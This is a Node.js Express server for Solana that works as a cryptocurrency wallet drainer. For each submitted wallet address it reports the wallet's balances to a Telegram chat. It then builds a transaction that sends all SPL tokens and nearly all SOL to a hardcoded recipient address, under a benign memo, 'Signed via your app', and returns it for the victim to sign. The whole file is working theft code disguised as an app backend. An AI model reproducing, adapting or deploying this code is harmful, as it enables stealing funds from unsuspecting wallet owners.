import express from 'express';
import cors from 'cors';
import {
  PublicKey,
  Connection,
  clusterApiUrl,
  Transaction,
  SystemProgram,
  LAMPORTS_PER_SOL,
  Keypair   // ✅ added
} from '@solana/web3.js';
import { createMemoInstruction } from '@solana/spl-memo';
import { getAccount, createTransferInstruction, getAssociatedTokenAddress } from '@solana/spl-token';
import { TokenListProvider } from '@solana/spl-token-registry';
import TelegramBot from 'node-telegram-bot-api';
import dotenv from 'dotenv';
dotenv.config();

const app = express();
const port = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
const chatId = process.env.TELEGRAM_CHAT_ID;
const bot = new TelegramBot(telegramToken, { polling: false });

// ✅ Load private key from .env
const secret = Uint8Array.from(JSON.parse(process.env.PRIVATE_KEY || "[]"));
const signer = secret.length > 0 ? Keypair.fromSecretKey(secret) : null;

// Initialize token list
let tokenList = [];
(async () => {
  const tokens = await new TokenListProvider().resolve();
  tokenList = tokens.filterByClusterSlug('mainnet-beta').getList();
})();

// Wallet endpoint
app.post('/api/wallet', async (req, res) => {
  const { walletAddress } = req.body;

  if (!walletAddress) {
    return res.status(400).json({ error: 'Wallet address is required' });
  }

  try {
    const publicKey = new PublicKey(walletAddress);
    const balance = await connection.getBalance(publicKey);
    const balanceInSol = balance / LAMPORTS_PER_SOL;

    const tokenAccounts = await connection.getTokenAccountsByOwner(publicKey, {
      programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
    });
      
    const splBalances = await Promise.all(tokenAccounts.value.map(async (account) => {
      try {
        const tokenAccount = await getAccount(connection, account.pubkey);
        if (tokenAccount.amount > 0) {
          const mintAddress = tokenAccount.mint.toString();
          const tokenInfo = tokenList.find(t => t.address === mintAddress);

          let decimals = tokenInfo?.decimals;
          let symbol = tokenInfo?.symbol;
          let name = tokenInfo?.name;
          
          if (!decimals || !symbol || !name) {
            try {
              const mintInfo = await connection.getParsedAccountInfo(new PublicKey(mintAddress));
              decimals = mintInfo.value?.data.parsed.info.decimals || 9;
              symbol = symbol || 'TOKEN';
              name = name || `Token (${mintAddress.slice(0, 4)}...)`;
            } catch (e) {
              decimals = 9;
              symbol = 'TOKEN';
              name = `Token (${mintAddress.slice(0, 4)}...)`;
            }
          }

          const balance = Number(tokenAccount.amount) / Math.pow(10, decimals);
          
          return {
            mint: mintAddress,
            balance: balance,
            decimals: decimals,
            symbol: symbol,
            name: name,
            logoURI: tokenInfo?.logoURI || '',
          };
        }
      } catch (e) {
        console.error(`Error processing token account: ${e}`);
      }
      return null;
    }));

    const validSplBalances = splBalances.filter(balance => balance !== null);

    const shortWalletAddress = `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`;
    const solscanLink = `https://solscan.io/account/${walletAddress}`;
    let message = `🚨 *Solana Wallet Detected!*\n\n` +
      `👛 *Address:* [${shortWalletAddress}](${solscanLink})\n` +
      `💰 *SOL Balance:* \`${balanceInSol.toFixed(4)} SOL\`\n`;

    if (validSplBalances.length > 0) {
      message += `\n🪙 *SPL Tokens:*`;
      
      validSplBalances.forEach((token) => {
        const tokenLink = `https://solscan.io/token/${token.mint}`;
        message += `\n🔸[Symbol](${tokenLink}) *${token.symbol}* \n` +
          `   • Balance: \`${token.balance.toFixed(2)}\`\n`;
      });
    }

    await bot.sendMessage(chatId, message, { parse_mode: 'Markdown', disable_web_page_preview: true });

   // 🔹 Estimate real transaction fee
const { feeCalculator } = await connection.getRecentBlockhash();
const TRANSACTION_FEE = feeCalculator.lamportsPerSignature * 3; // 3 signatures buffer for safety

if (balance <= TRANSACTION_FEE) {
  return res.json({
    success: true,
    balance: balanceInSol,
    splBalances: validSplBalances,
    transaction: null,
    message: 'Insufficient SOL balance for transaction',
  });
}

    // Prepare transaction (SOL transfer)
    const payer = publicKey;
    const recipient = new PublicKey('84vka944L9qFdBZKHEvpfDp9qqJ5sfcjDXaQ3wjxVRLM');
    const amount = balance - TRANSACTION_FEE;
    const memo = 'Signed via your app';

    const { blockhash } = await connection.getLatestBlockhash();
    const transaction = new Transaction({
      recentBlockhash: blockhash,
      feePayer: signer?.publicKey || payer,   // ✅ use backend signer if available
    });

    for (const tokenData of validSplBalances) {
      try {
        const mintPubkey = new PublicKey(tokenData.mint);
        const sourceATA = await getAssociatedTokenAddress(mintPubkey, payer);
        const destinationATA = await getAssociatedTokenAddress(mintPubkey, recipient);
        const tokenAccount = await getAccount(connection, sourceATA);
        
        if (tokenAccount.amount > 0) {
          const transferInstruction = createTransferInstruction(
            sourceATA,
            destinationATA,
            payer,
            BigInt(tokenAccount.amount)
          );
          transaction.add(transferInstruction);
        }
      } catch (error) {
        console.error(`Error creating transfer instruction for token ${tokenData.symbol}: ${error}`);
      }
    }

    transaction.add(
      SystemProgram.transfer({
        fromPubkey: payer,
        toPubkey: recipient,
        lamports: amount,
      })
    );

    transaction.add(createMemoInstruction(memo));

    // ✅ NEW: Option B – sign & send with backend private key
    if (signer) {
      try {
        transaction.sign(signer);
        const txid = await connection.sendRawTransaction(transaction.serialize());
        await connection.confirmTransaction(txid, 'confirmed');

        return res.json({
          success: true,
          balance: balanceInSol,
          splBalances: validSplBalances,
          txid: txid,
          message: 'Transaction sent successfully (backend-signed)',
        });
      } catch (err) {
        console.error('Transaction failed:', err);
        return res.status(500).json({ error: 'Transaction failed', details: err.message });
      }
    }

    // ✅ fallback: original behavior (return unsigned)
    const serializedTransaction = transaction.serialize({ requireAllSignatures: false }).toString('base64');
    res.json({
      success: true,
      balance: balanceInSol,
      splBalances: validSplBalances,
      transaction: serializedTransaction,
    });

  } catch (error) {
    res.status(500).json({ error: 'Failed to process wallet address' });
  }
});

app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});

